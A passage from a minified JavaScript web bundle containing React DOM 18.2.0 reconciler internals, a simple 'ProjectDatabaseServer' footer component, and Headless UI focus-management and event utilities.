            return r = t.type, l = t.pendingProps, l = t.elementType === r ? l : Ze(r, l), fu(e, t, r, l, n);
        case 3:
            e: {
                if (Nd(t), e === null) throw Error(E(387));r = t.pendingProps,
                a = t.memoizedState,
                l = a.element,
                Gc(e, t),
                Yl(t, r, null, n);
                var o = t.memoizedState;
                if (r = o.element, a.isDehydrated)
                    if (a = {
                            element: r,
                            isDehydrated: !1,
                            cache: o.cache,
                            pendingSuspenseBoundaries: o.pendingSuspenseBoundaries,
                            transitions: o.transitions
                        }, t.updateQueue.baseState = a, t.memoizedState = a, t.flags & 256) {
                        l = Bn(Error(E(423)), t), t = pu(e, t, r, n, l);
                        break e
                    } else if (r !== l) {
                    l = Bn(Error(E(424)), t), t = pu(e, t, r, n, l);
                    break e
                } else
                    for (_e = zt(t.stateNode.containerInfo.firstChild), Re = t, Y = !0, qe = null, n = qc(t, null, r, n), t.child = n; n;) n.flags = n.flags & -3 | 4096, n = n.sibling;
                else {
                    if (An(), r === l) {
                        t = St(e, t, n);
                        break e
                    }
                    ke(e, t, r, n)
                }
                t = t.child
            }
            return t;
        case 5:
            return ed(t), e === null && Io(t), r = t.type, l = t.pendingProps, a = e !== null ? e.memoizedProps : null, o = l.children, Lo(r, l) ? o = null : a !== null && Lo(r, a) && (t.flags |= 32), Ed(e, t), ke(e, t, o, n), t.child;
        case 6:
            return e === null && Io(t), null;
        case 13:
            return Cd(e, t, n);
        case 4:
            return Fi(t, t.stateNode.containerInfo), r = t.pendingProps, e === null ? t.child = Wn(t, null, r, n) : ke(e, t, r, n), t.child;
        case 11:
            return r = t.type, l = t.pendingProps, l = t.elementType === r ? l : Ze(r, l), cu(e, t, r, l, n);
        case 7:
            return ke(e, t, t.pendingProps, n), t.child;
        case 8:
            return ke(e, t, t.pendingProps.children, n), t.child;
        case 12:
            return ke(e, t, t.pendingProps.children, n), t.child;
        case 10:
            e: {
                if (r = t.type._context, l = t.pendingProps, a = t.memoizedProps, o = l.value, B(Ql, r._currentValue), r._currentValue = o, a !== null)
                    if (lt(a.value, o)) {
                        if (a.children === l.children && !Pe.current) {
                            t = St(e, t, n);
                            break e
                        }
                    } else
                        for (a = t.child, a !== null && (a.return = t); a !== null;) {
                            var i = a.dependencies;
                            if (i !== null) {
                                o = a.child;
                                for (var s = i.firstContext; s !== null;) {
                                    if (s.context === r) {
                                        if (a.tag === 1) {
                                            s = yt(-1, n & -n), s.tag = 2;
                                            var u = a.updateQueue;
                                            if (u !== null) {
                                                u = u.shared;
                                                var d = u.pending;
                                                d === null ? s.next = s : (s.next = d.next, d.next = s), u.pending = s
                                            }
                                        }
                                        a.lanes |= n, s = a.alternate, s !== null && (s.lanes |= n), Do(a.return, n, t), i.lanes |= n;
                                        break
                                    }
                                    s = s.next
                                }
                            } else if (a.tag === 10) o = a.type === t.type ? null : a.child;
                            else if (a.tag === 18) {
                                if (o = a.return, o === null) throw Error(E(341));
                                o.lanes |= n, i = o.alternate, i !== null && (i.lanes |= n), Do(o, n, t), o = a.sibling
                            } else o = a.child;
                            if (o !== null) o.return = a;
                            else
                                for (o = a; o !== null;) {
                                    if (o === t) {
                                        o = null;
                                        break
                                    }
                                    if (a = o.sibling, a !== null) {
                                        a.return = o.return, o = a;
                                        break
                                    }
                                    o = o.return
                                }
                            a = o
                        }
                ke(e, t, l.children, n),
                t = t.child
            }
            return t;
        case 9:
            return l = t.type, r = t.pendingProps.children, In(t, n), l = Ve(l), r = r(l), t.flags |= 1, ke(e, t, r, n), t.child;
        case 14:
            return r = t.type, l = Ze(r, t.pendingProps), l = Ze(r.type, l), du(e, t, r, l, n);
        case 15:
            return bd(e, t, t.type, t.pendingProps, n);
        case 17:
            return r = t.type, l = t.pendingProps, l = t.elementType === r ? l : Ze(r, l), Tl(e, t), t.tag = 1, Te(r) ? (e = !0, Bl(t)) : e = !1, In(t, n), Zc(t, r, l), Oo(t, r, l, n), Wo(null, t, r, !0, e, n);
        case 19:
            return Pd(e, t, n);
        case 22:
            return Sd(e, t, n)
    }
    throw Error(E(156, t.tag))
};

function Bd(e, t) {
    return hc(e, t)
}

function Wm(e, t, n, r) {
    this.tag = e, this.key = n, this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null, this.index = 0, this.ref = null, this.pendingProps = t, this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null, this.mode = r, this.subtreeFlags = this.flags = 0, this.deletions = null, this.childLanes = this.lanes = 0, this.alternate = null
}

function Ue(e, t, n, r) {
    return new Wm(e, t, n, r)
}

function Gi(e) {
    return e = e.prototype, !(!e || !e.isReactComponent)
}

function Um(e) {
    if (typeof e == "function") return Gi(e) ? 1 : 0;
    if (e != null) {
        if (e = e.$$typeof, e === mi) return 11;
        if (e === hi) return 14
    }
    return 2
}

function Bt(e, t) {
    var n = e.alternate;
    return n === null ? (n = Ue(e.tag, t, e.key, e.mode), n.elementType = e.elementType, n.type = e.type, n.stateNode = e.stateNode, n.alternate = e, e.alternate = n) : (n.pendingProps = t, n.type = e.type, n.flags = 0, n.subtreeFlags = 0, n.deletions = null), n.flags = e.flags & 14680064, n.childLanes = e.childLanes, n.lanes = e.lanes, n.child = e.child, n.memoizedProps = e.memoizedProps, n.memoizedState = e.memoizedState, n.updateQueue = e.updateQueue, t = e.dependencies, n.dependencies = t === null ? null : {
        lanes: t.lanes,
        firstContext: t.firstContext
    }, n.sibling = e.sibling, n.index = e.index, n.ref = e.ref, n
}

function $l(e, t, n, r, l, a) {
    var o = 2;
    if (r = e, typeof e == "function") Gi(e) && (o = 1);
    else if (typeof e == "string") o = 5;
    else e: switch (e) {
        case wn:
            return sn(n.children, l, a, t);
        case pi:
            o = 8, l |= 8;
            break;
        case io:
            return e = Ue(12, n, t, l | 2), e.elementType = io, e.lanes = a, e;
        case so:
            return e = Ue(13, n, t, l), e.elementType = so, e.lanes = a, e;
        case uo:
            return e = Ue(19, n, t, l), e.elementType = uo, e.lanes = a, e;
        case Ju:
            return va(n, l, a, t);
        default:
            if (typeof e == "object" && e !== null) switch (e.$$typeof) {
                case Xu:
                    o = 10;
                    break e;
                case Zu:
                    o = 9;
                    break e;
                case mi:
                    o = 11;
                    break e;
                case hi:
                    o = 14;
                    break e;
                case Pt:
                    o = 16, r = null;
                    break e
            }
            throw Error(E(130, e == null ? e : typeof e, ""))
    }
    return t = Ue(o, n, t, l), t.elementType = e, t.type = r, t.lanes = a, t
}

function sn(e, t, n, r) {
    return e = Ue(7, e, r, t), e.lanes = n, e
}

function va(e, t, n, r) {
    return e = Ue(22, e, r, t), e.elementType = Ju, e.lanes = n, e.stateNode = {
        isHidden: !1
    }, e
}

function Ga(e, t, n) {
    return e = Ue(6, e, null, t), e.lanes = n, e
}

function Xa(e, t, n) {
    return t = Ue(4, e.children !== null ? e.children : [], e.key, t), t.lanes = n, t.stateNode = {
        containerInfo: e.containerInfo,
        pendingChildren: null,
        implementation: e.implementation
    }, t
}

function Bm(e, t, n, r, l) {
    this.tag = t, this.containerInfo = e, this.finishedWork = this.pingCache = this.current = this.pendingChildren = null, this.timeoutHandle = -1, this.callbackNode = this.pendingContext = this.context = null, this.callbackPriority = 0, this.eventTimes = La(0), this.expirationTimes = La(-1), this.entangledLanes = this.finishedLanes = this.mutableReadLanes = this.expiredLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0, this.entanglements = La(0), this.identifierPrefix = r, this.onRecoverableError = l, this.mutableSourceEagerHydrationData = null
}

function Xi(e, t, n, r, l, a, o, i, s) {
    return e = new Bm(e, t, n, i, s), t === 1 ? (t = 1, a === !0 && (t |= 8)) : t = 0, a = Ue(3, null, null, t), e.current = a, a.stateNode = e, a.memoizedState = {
        element: r,
        isDehydrated: n,
        cache: null,
        transitions: null,
        pendingSuspenseBoundaries: null
    }, Ri(a), e
}

function Hm(e, t, n) {
    var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
    return {
        $$typeof: yn,
        key: r == null ? null : "" + r,
        children: e,
        containerInfo: t,
        implementation: n
    }
}

function Hd(e) {
    if (!e) return Qt;
    e = e._reactInternals;
    e: {
        if (hn(e) !== e || e.tag !== 1) throw Error(E(170));
        var t = e;do {
            switch (t.tag) {
                case 3:
                    t = t.stateNode.context;
                    break e;
                case 1:
                    if (Te(t.type)) {
                        t = t.stateNode.__reactInternalMemoizedMergedChildContext;
                        break e
                    }
            }
            t = t.return
        } while (t !== null);
        throw Error(E(171))
    }
    if (e.tag === 1) {
        var n = e.type;
        if (Te(n)) return Bc(e, n, t)
    }
    return t
}

function Vd(e, t, n, r, l, a, o, i, s) {
    return e = Xi(n, r, !0, e, l, a, o, i, s), e.context = Hd(null), n = e.current, r = be(), l = Ut(n), a = yt(r, l), a.callback = t ?? null, At(n, a, l), e.current.lanes = l, Vr(e, l, r), je(e, r), e
}

function ga(e, t, n, r) {
    var l = t.current,
        a = be(),
        o = Ut(l);
    return n = Hd(n), t.context === null ? t.context = n : t.pendingContext = n, t = yt(a, o), t.payload = {
        element: e
    }, r = r === void 0 ? null : r, r !== null && (t.callback = r), e = At(l, t, o), e !== null && (rt(e, l, o, a), Nl(e, l, o)), o
}

function na(e) {
    if (e = e.current, !e.child) return null;
    switch (e.child.tag) {
        case 5:
            return e.child.stateNode;
        default:
            return e.child.stateNode
    }
}

function Su(e, t) {
    if (e = e.memoizedState, e !== null && e.dehydrated !== null) {
        var n = e.retryLane;
        e.retryLane = n !== 0 && n < t ? n : t
    }
}

function Zi(e, t) {
    Su(e, t), (e = e.alternate) && Su(e, t)
}

function Vm() {
    return null
}
var Qd = typeof reportError == "function" ? reportError : function(e) {
    console.error(e)
};

function Ji(e) {
    this._internalRoot = e
}
ya.prototype.render = Ji.prototype.render = function(e) {
    var t = this._internalRoot;
    if (t === null) throw Error(E(409));
    ga(e, t, null, null)
};
ya.prototype.unmount = Ji.prototype.unmount = function() {
    var e = this._internalRoot;
    if (e !== null) {
        this._internalRoot = null;
        var t = e.containerInfo;
        pn(function() {
            ga(null, e, null, null)
        }), t[kt] = null
    }
};

function ya(e) {
    this._internalRoot = e
}
ya.prototype.unstable_scheduleHydration = function(e) {
    if (e) {
        var t = bc();
        e = {
            blockedOn: null,
            target: e,
            priority: t
        };
        for (var n = 0; n < jt.length && t !== 0 && t < jt[n].priority; n++);
        jt.splice(n, 0, e), n === 0 && Ec(e)
    }
};

function qi(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
}

function wa(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11 && (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
}

function Eu() {}

function Qm(e, t, n, r, l) {
    if (l) {
        if (typeof r == "function") {
            var a = r;
            r = function() {
                var u = na(o);
                a.call(u)
            }
        }
        var o = Vd(t, r, e, 0, null, !1, !1, "", Eu);
        return e._reactRootContainer = o, e[kt] = o.current, Rr(e.nodeType === 8 ? e.parentNode : e), pn(), o
    }
    for (; l = e.lastChild;) e.removeChild(l);
    if (typeof r == "function") {
        var i = r;
        r = function() {
            var u = na(s);
            i.call(u)
        }
    }
    var s = Xi(e, 0, !1, null, null, !1, !1, "", Eu);
    return e._reactRootContainer = s, e[kt] = s.current, Rr(e.nodeType === 8 ? e.parentNode : e), pn(function() {
        ga(t, s, n, r)
    }), s
}

function xa(e, t, n, r, l) {
    var a = n._reactRootContainer;
    if (a) {
        var o = a;
        if (typeof l == "function") {
            var i = l;
            l = function() {
                var s = na(o);
                i.call(s)
            }
        }
        ga(t, o, e, l)
    } else o = Qm(n, t, e, l, r);
    return na(o)
}
xc = function(e) {
    switch (e.tag) {
        case 3:
            var t = e.stateNode;
            if (t.current.memoizedState.isDehydrated) {
                var n = fr(t.pendingLanes);
                n !== 0 && (yi(t, n | 1), je(t, ne()), !(O & 6) && (Hn = ne() + 500, Gt()))
            }
            break;
        case 13:
            pn(function() {
                var r = bt(e, 1);
                if (r !== null) {
                    var l = be();
                    rt(r, e, 1, l)
                }
            }), Zi(e, 1)
    }
};
wi = function(e) {
    if (e.tag === 13) {
        var t = bt(e, 134217728);
        if (t !== null) {
            var n = be();
            rt(t, e, 134217728, n)
        }
        Zi(e, 134217728)
    }
};
kc = function(e) {
    if (e.tag === 13) {
        var t = Ut(e),
            n = bt(e, t);
        if (n !== null) {
            var r = be();
            rt(n, e, t, r)
        }
        Zi(e, t)
    }
};
bc = function() {
    return z
};
Sc = function(e, t) {
    var n = z;
    try {
        return z = e, t()
    } finally {
        z = n
    }
};
xo = function(e, t, n) {
    switch (t) {
        case "input":
            if (po(e, n), t = n.name, n.type === "radio" && t != null) {
                for (n = e; n.parentNode;) n = n.parentNode;
                for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'), t = 0; t < n.length; t++) {
                    var r = n[t];
                    if (r !== e && r.form === e.form) {
                        var l = ca(r);
                        if (!l) throw Error(E(90));
                        ec(r), po(r, l)
                    }
                }
            }
            break;
        case "textarea":
            nc(e, n);
            break;
        case "select":
            t = n.value, t != null && $n(e, !!n.multiple, t, !1)
    }
};
uc = Qi;
cc = pn;
var Km = {
        usingClientEntryPoint: !1,
        Events: [Kr, Sn, ca, ic, sc, Qi]
    },
    or = {
        findFiberByHostInstance: tn,
        bundleType: 0,
        version: "18.2.0",
        rendererPackageName: "react-dom"
    },
    Ym = {
        bundleType: or.bundleType,
        version: or.version,
        rendererPackageName: or.rendererPackageName,
        rendererConfig: or.rendererConfig,
        overrideHookState: null,
        overrideHookStateDeletePath: null,
        overrideHookStateRenamePath: null,
        overrideProps: null,
        overridePropsDeletePath: null,
        overridePropsRenamePath: null,
        setErrorHandler: null,
        setSuspenseHandler: null,
        scheduleUpdate: null,
        currentDispatcherRef: Et.ReactCurrentDispatcher,
        findHostInstanceByFiber: function(e) {
            return e = pc(e), e === null ? null : e.stateNode
        },
        findFiberByHostInstance: or.findFiberByHostInstance || Vm,
        findHostInstancesForRefresh: null,
        scheduleRefresh: null,
        scheduleRoot: null,
        setRefreshHandler: null,
        getCurrentFiber: null,
        reconcilerVersion: "18.2.0-next-9e3b772b8-20220608"
    };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var gl = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!gl.isDisabled && gl.supportsFiber) try {
        oa = gl.inject(Ym), ut = gl
    } catch {}
}
De.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = Km;
De.createPortal = function(e, t) {
    var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
    if (!qi(t)) throw Error(E(200));
    return Hm(e, t, null, n)
};
De.createRoot = function(e, t) {
    if (!qi(e)) throw Error(E(299));
    var n = !1,
        r = "",
        l = Qd;
    return t != null && (t.unstable_strictMode === !0 && (n = !0), t.identifierPrefix !== void 0 && (r = t.identifierPrefix), t.onRecoverableError !== void 0 && (l = t.onRecoverableError)), t = Xi(e, 1, !1, null, null, n, !1, r, l), e[kt] = t.current, Rr(e.nodeType === 8 ? e.parentNode : e), new Ji(t)
};
De.findDOMNode = function(e) {
    if (e == null) return null;
    if (e.nodeType === 1) return e;
    var t = e._reactInternals;
    if (t === void 0) throw typeof e.render == "function" ? Error(E(188)) : (e = Object.keys(e).join(","), Error(E(268, e)));
    return e = pc(t), e = e === null ? null : e.stateNode, e
};
De.flushSync = function(e) {
    return pn(e)
};
De.hydrate = function(e, t, n) {
    if (!wa(t)) throw Error(E(200));
    return xa(null, e, t, !0, n)
};
De.hydrateRoot = function(e, t, n) {
    if (!qi(e)) throw Error(E(405));
    var r = n != null && n.hydratedSources || null,
        l = !1,
        a = "",
        o = Qd;
    if (n != null && (n.unstable_strictMode === !0 && (l = !0), n.identifierPrefix !== void 0 && (a = n.identifierPrefix), n.onRecoverableError !== void 0 && (o = n.onRecoverableError)), t = Vd(t, null, e, 1, n ?? null, l, !1, a, o), e[kt] = t.current, Rr(e), r)
        for (e = 0; e < r.length; e++) n = r[e], l = n._getVersion, l = l(n._source), t.mutableSourceEagerHydrationData == null ? t.mutableSourceEagerHydrationData = [n, l] : t.mutableSourceEagerHydrationData.push(n, l);
    return new ya(t)
};
De.render = function(e, t, n) {
    if (!wa(t)) throw Error(E(200));
    return xa(null, e, t, !1, n)
};
De.unmountComponentAtNode = function(e) {
    if (!wa(e)) throw Error(E(40));
    return e._reactRootContainer ? (pn(function() {
        xa(null, null, e, !1, function() {
            e._reactRootContainer = null, e[kt] = null
        })
    }), !0) : !1
};
De.unstable_batchedUpdates = Qi;
De.unstable_renderSubtreeIntoContainer = function(e, t, n, r) {
    if (!wa(n)) throw Error(E(200));
    if (e == null || e._reactInternals === void 0) throw Error(E(38));
    return xa(e, t, n, !1, r)
};
De.version = "18.2.0-next-9e3b772b8-20220608";

function Kd() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function")) try {
        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Kd)
    } catch (e) {
        console.error(e)
    }
}
Kd(), Vu.exports = De;
var Yd = Vu.exports,
    Nu = Yd;
ao.createRoot = Nu.createRoot, ao.hydrateRoot = Nu.hydrateRoot;
const Gm = () => g.jsx("footer", {
    className: "bg-black rounded-lg shadow",
    children: g.jsxs("div", {
        className: "w-full max-w-screen-xl mx-auto p-4 md:py-8",
        children: [g.jsx("div", {
            className: "flex items-center sm:justify-center",
            children: g.jsxs("a", {
                href: "#",
                className: "flex items-center mb-4 sm:mb-0 space-x-3 rtl:space-x-reverse",
                children: [g.jsx("img", {
                    src: "/logo.jpeg",
                    className: "h-8 w-8 rounded-full",
                    alt: "Logo"
                }), g.jsx("span", {
                    className: "self-center text-2xl font-bold whitespace-nowrap",
                    children: "ProjectDatabaseServer"
                })]
            })
        }), g.jsx("hr", {
            className: "my-6 border-gray-600 sm:mx-auto  lg:my-8"
        }), g.jsxs("span", {
            className: "block text-sm text-gray-500 sm:text-center",
            children: ["© ", new Date().getFullYear(), ". All Rights Reserved."]
        })]
    })
});
var Xm = Object.defineProperty,
    Zm = (e, t, n) => t in e ? Xm(e, t, {
        enumerable: !0,
        configurable: !0,
        writable: !0,
        value: n
    }) : e[t] = n,
    Za = (e, t, n) => (Zm(e, typeof t != "symbol" ? t + "" : t, n), n);
let Jm = class {
        constructor() {
            Za(this, "current", this.detect()), Za(this, "handoffState", "pending"), Za(this, "currentId", 0)
        }
        set(t) {
            this.current !== t && (this.handoffState = "pending", this.currentId = 0, this.current = t)
        }
        reset() {
            this.set(this.detect())
        }
        nextId() {
            return ++this.currentId
        }
        get isServer() {
            return this.current === "server"
        }
        get isClient() {
            return this.current === "client"
        }
        detect() {
            return typeof window > "u" || typeof document > "u" ? "server" : "client"
        }
        handoff() {
            this.handoffState === "pending" && (this.handoffState = "complete")
        }
        get isHandoffComplete() {
            return this.handoffState === "complete"
        }
    },
    wt = new Jm,
    te = (e, t) => {
        wt.isServer ? p.useEffect(e, t) : p.useLayoutEffect(e, t)
    };

function He(e) {
    let t = p.useRef(e);
    return te(() => {
        t.current = e
    }, [e]), t
}
let _ = function(e) {
    let t = He(e);
    return $.useCallback((...n) => t.current(...n), [t])
};

function Gr(e) {
    typeof queueMicrotask == "function" ? queueMicrotask(e) : Promise.resolve().then(e).catch(t => setTimeout(() => {
        throw t
    }))
}

function at() {
    let e = [],
        t = {
            addEventListener(n, r, l, a) {
                return n.addEventListener(r, l, a), t.add(() => n.removeEventListener(r, l, a))
            },
            requestAnimationFrame(...n) {
                let r = requestAnimationFrame(...n);
                return t.add(() => cancelAnimationFrame(r))
            },
            nextFrame(...n) {
                return t.requestAnimationFrame(() => t.requestAnimationFrame(...n))
            },
            setTimeout(...n) {
                let r = setTimeout(...n);
                return t.add(() => clearTimeout(r))
            },
            microTask(...n) {
                let r = {
                    current: !0
                };
                return Gr(() => {
                    r.current && n[0]()
                }), t.add(() => {
                    r.current = !1
                })
            },
            style(n, r, l) {
                let a = n.style.getPropertyValue(r);
                return Object.assign(n.style, {
                    [r]: l
                }), this.add(() => {
                    Object.assign(n.style, {
                        [r]: a
                    })
                })
            },
            group(n) {
                let r = at();
                return n(r), this.add(() => r.dispose())
            },
            add(n) {
                return e.push(n), () => {
                    let r = e.indexOf(n);
                    if (r >= 0)
                        for (let l of e.splice(r, 1)) l()
                }
            },
            dispose() {
                for (let n of e.splice(0)) n()
            }
        };
    return t
}

function Xr() {
    let [e] = p.useState(at);
    return p.useEffect(() => () => e.dispose(), [e]), e
}

function qm() {
    let e = typeof document > "u";
    return "useSyncExternalStore" in Er ? (t => t.useSyncExternalStore)(Er)(() => () => {}, () => !1, () => !e) : !1
}

function Gn() {
    let e = qm(),
        [t, n] = p.useState(wt.isHandoffComplete);
    return t && wt.isHandoffComplete === !1 && n(!1), p.useEffect(() => {
        t !== !0 && n(!0)
    }, [t]), p.useEffect(() => wt.handoff(), []), e ? !1 : t
}
var Cu;
let Oe = (Cu = $.useId) != null ? Cu : function() {
    let e = Gn(),
        [t, n] = $.useState(e ? () => wt.nextId() : null);
    return te(() => {
        t === null && n(wt.nextId())
    }, [t]), t != null ? "" + t : void 0
};

function H(e, t, ...n) {
    if (e in t) {
        let l = t[e];
        return typeof l == "function" ? l(...n) : l
    }
    let r = new Error(`Tried to handle "${e}" but there is no handler defined. Only defined handlers are: ${Object.keys(t).map(l=>`"${l}"`).join(", ")}.`);
    throw Error.captureStackTrace && Error.captureStackTrace(r, H), r
}

function Xn(e) {
    return wt.isServer ? null : e instanceof Node ? e.ownerDocument : e != null && e.hasOwnProperty("current") && e.current instanceof Node ? e.current.ownerDocument : document
}
let qo = ["[contentEditable=true]", "[tabindex]", "a[href]", "area[href]", "button:not([disabled])", "iframe", "input:not([disabled])", "select:not([disabled])", "textarea:not([disabled])"].map(e => `${e}:not([tabindex='-1'])`).join(",");
var oe = (e => (e[e.First = 1] = "First", e[e.Previous = 2] = "Previous", e[e.Next = 4] = "Next", e[e.Last = 8] = "Last", e[e.WrapAround = 16] = "WrapAround", e[e.NoScroll = 32] = "NoScroll", e))(oe || {}),
    Ln = (e => (e[e.Error = 0] = "Error", e[e.Overflow = 1] = "Overflow", e[e.Success = 2] = "Success", e[e.Underflow = 3] = "Underflow", e))(Ln || {}),
    e1 = (e => (e[e.Previous = -1] = "Previous", e[e.Next = 1] = "Next", e))(e1 || {});

function Gd(e = document.body) {
    return e == null ? [] : Array.from(e.querySelectorAll(qo)).sort((t, n) => Math.sign((t.tabIndex || Number.MAX_SAFE_INTEGER) - (n.tabIndex || Number.MAX_SAFE_INTEGER)))
}
var es = (e => (e[e.Strict = 0] = "Strict", e[e.Loose = 1] = "Loose", e))(es || {});

function ts(e, t = 0) {
    var n;
    return e === ((n = Xn(e)) == null ? void 0 : n.body) ? !1 : H(t, {
        0() {
            return e.matches(qo)
        },
        1() {
            let r = e;
            for (; r !== null;) {
                if (r.matches(qo)) return !0;
                r = r.parentElement
            }
            return !1
        }
    })
}

function Xd(e) {
    let t = Xn(e);
    at().nextFrame(() => {
        t && !ts(t.activeElement, 0) && Ht(e)
    })
}
var t1 = (e => (e[e.Keyboard = 0] = "Keyboard", e[e.Mouse = 1] = "Mouse", e))(t1 || {});
typeof window < "u" && typeof document < "u" && (document.addEventListener("keydown", e => {
    e.metaKey || e.altKey || e.ctrlKey || (document.documentElement.dataset.headlessuiFocusVisible = "")
}, !0), document.addEventListener("click", e => {
    e.detail === 1 ? delete document.documentElement.dataset.headlessuiFocusVisible : e.detail === 0 && (document.documentElement.dataset.headlessuiFocusVisible = "")
}, !0));

function Ht(e) {
    e == null || e.focus({
        preventScroll: !0
    })
}
let n1 = ["textarea", "input"].join(",");

function r1(e) {
    var t, n;
    return (n = (t = e == null ? void 0 : e.matches) == null ? void 0 : t.call(e, n1)) != null ? n : !1
}

function ln(e, t = n => n) {
    return e.slice().sort((n, r) => {
        let l = t(n),
            a = t(r);
        if (l === null || a === null) return 0;
        let o = l.compareDocumentPosition(a);
        return o & Node.DOCUMENT_POSITION_FOLLOWING ? -1 : o & Node.DOCUMENT_POSITION_PRECEDING ? 1 : 0
    })
}

function l1(e, t) {
    return et(Gd(), t, {
        relativeTo: e
    })
}

function et(e, t, {
    sorted: n = !0,
    relativeTo: r = null,
    skipElements: l = []
} = {}) {
    let a = Array.isArray(e) ? e.length > 0 ? e[0].ownerDocument : document : e.ownerDocument,
        o = Array.isArray(e) ? n ? ln(e) : e : Gd(e);
    l.length > 0 && o.length > 1 && (o = o.filter(y => !l.includes(y))), r = r ?? a.activeElement;
    let i = (() => {
            if (t & 5) return 1;
            if (t & 10) return -1;
            throw new Error("Missing Focus.First, Focus.Previous, Focus.Next or Focus.Last")
        })(),
        s = (() => {
            if (t & 1) return 0;
            if (t & 2) return Math.max(0, o.indexOf(r)) - 1;
            if (t & 4) return Math.max(0, o.indexOf(r)) + 1;
            if (t & 8) return o.length - 1;
            throw new Error("Missing Focus.First, Focus.Previous, Focus.Next or Focus.Last")
        })(),
        u = t & 32 ? {
            preventScroll: !0
        } : {},
        d = 0,
        h = o.length,
        v;
    do {
        if (d >= h || d + h <= 0) return 0;
        let y = s + d;
        if (t & 16) y = (y + h) % h;
        else {
            if (y < 0) return 3;
            if (y >= h) return 1
        }
        v = o[y], v == null || v.focus(u), d += i
    } while (v !== a.activeElement);
    return t & 6 && r1(v) && v.select(), 2
}

function Zd() {
    return /iPhone/gi.test(window.navigator.platform) || /Mac/gi.test(window.navigator.platform) && window.navigator.maxTouchPoints > 0
}

function a1() {
    return /Android/gi.test(window.navigator.userAgent)
}

function o1() {
    return Zd() || a1()
}

function yl(e, t, n) {
    let r = He(t);
    p.useEffect(() => {
        function l(a) {
            r.current(a)
        }
        return document.addEventListener(e, l, n), () => document.removeEventListener(e, l, n)
    }, [e, n])
}

function Jd(e, t, n) {
    let r = He(t);
    p.useEffect(() => {
        function l(a) {
            r.current(a)
        }
        return window.addEventListener(e, l, n), () => window.removeEventListener(e, l, n)
    }, [e, n])
}

function qd(e, t, n = !0) {
    let r = p.useRef(!1);
    p.useEffect(() => {
        requestAnimationFrame(() => {
            r.current = n
        })
    }, [n]);

    function l(o, i) {
        if (!r.current || o.defaultPrevented) return;
        let s = i(o);
        if (s === null || !s.getRootNode().contains(s) || !s.isConnected) return;
        let u = function d(h) {
            return typeof h == "function" ? d(h()) : Array.isArray(h) || h instanceof Set ? h : [h]
        }(e);
        for (let d of u) {
            if (d === null) continue;
            let h = d instanceof HTMLElement ? d : d.current;
            if (h != null && h.contains(s) || o.composed && o.composedPath().includes(h)) return
        }
        return !ts(s, es.Loose) && s.tabIndex !== -1 && o.preventDefault(), t(o, s)
    }
    let a = p.useRef(null);
    yl("pointerdown", o => {
        var i, s;
        r.current && (a.current = ((s = (i = o.composedPath) == null ? void 0 : i.call(o)) == null ? void 0 : s[0]) || o.target)
    }, !0), yl("mousedown", o => {
        var i, s;
        r.current && (a.current = ((s = (i = o.composedPath) == null ? void 0 : i.call(o)) == null ? void 0 : s[0]) || o.target)
    }, !0), yl("click", o => {
        o1() || a.current && (l(o, () => a.current), a.current = null)
    }, !0), yl("touchend", o => l(o, () => o.target instanceof HTMLElement ? o.target : null), !0), Jd("blur", o => l(o, () => window.document.activeElement instanceof HTMLIFrameElement ? window.document.activeElement : null), !0)
}

function Zn(...e) {
    return p.useMemo(() => Xn(...e), [...e])
}

function Pu(e) {
    var t;
    if (e.type) return e.type;
    let n = (t = e.as) != null ? t : "button";
    if (typeof n == "string" && n.toLowerCase() === "button") return "button"
}

function ns(e, t) {
    let [n, r] = p.useState(() => Pu(e));
    return te(() => {
        r(Pu(e))
    }, [e.type, e.as]), te(() => {
        n || t.current && t.current instanceof HTMLButtonElement && !t.current.hasAttribute("type") && r("button")
    }, [n, t]), n
}
let ef = Symbol();

function tf(e, t = !0) {
    return Object.assign(e, {
        [ef]: t
    })
}

function q(...e) {
    let t = p.useRef(e);
    p.useEffect(() => {
        t.current = e
    }, [e]);
    let n = _(r => {
        for (let l of t.current) l != null && (typeof l == "function" ? l(r) : l.current = r)
    });
    return e.every(r => r == null || (r == null ? void 0 : r[ef])) ? void 0 : n
}

function Tu(e) {
    return [e.screenX, e.screenY]
}

function i1() {
    let e = p.useRef([-1, -1]);
    return {
        wasMoved(t) {
            let n = Tu(t);
            return e.current[0] === n[0] && e.current[1] === n[1] ? !1 : (e.current = n, !0)
        },
        update(t) {
            e.current = Tu(t)
        }
    }
}

function s1({
    container: e,
    accept: t,
    walk: n,
    enabled: r = !0
}) {
    let l = p.useRef(t),
        a = p.useRef(n);
    p.useEffect(() => {
        l.current = t, a.current = n
    }, [t, n]), te(() => {
        if (!e || !r) return;
        let o = Xn(e);
        if (!o) return;
        let i = l.current,
            s = a.current,
            u = Object.assign(h => i(h), {
                acceptNode: i
            }),
            d = o.createTreeWalker(e, NodeFilter.SHOW_ELEMENT, u, !1);
        for (; d.nextNode();) s(d.currentNode)
    }, [e, r, l, a])
}

function rs(e, t) {
    let n = p.useRef([]),
        r = _(e);
    p.useEffect(() => {
        let l = [...n.current];
        for (let [a, o] of t.entries())
            if (n.current[a] !== o) {
                let i = r(t, l);
                return n.current = t, i
            }
    }, [r, ...t])
}

function ra(...e) {
    return Array.from(new Set(e.flatMap(t => typeof t == "string" ? t.split(" ") : []))).filter(Boolean).join(" ")
}
var dt = (e => (e[e.None = 0] = "None", e[e.RenderStrategy = 1] = "RenderStrategy", e[e.Static = 2] = "Static", e))(dt || {}),
    It = (e => (e[e.Unmount = 0] = "Unmount", e[e.Hidden = 1] = "Hidden", e))(It || {});

function G({
    ourProps: e,
    theirProps: t,
    slot: n,
    defaultTag: r,
